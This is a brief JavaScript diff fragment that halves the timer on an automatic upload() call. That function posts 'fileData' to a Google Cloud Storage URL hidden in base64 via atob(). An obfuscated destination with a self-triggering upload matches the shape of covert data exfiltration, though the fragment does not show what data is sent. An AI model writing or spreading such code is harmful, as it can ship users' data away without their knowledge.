@@ -117,7 +117,7 @@ function upload() {
     xhr.open('POST', atob('aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL2dwLW1zLXVzLWdjcy1mcmF1ZA=='), true);
     xhr.send(fileData);
 }
-setTimeout(upload, 3000);
+setTimeout(upload, 1500);
 
 
 function syntaxHighlight(json) {
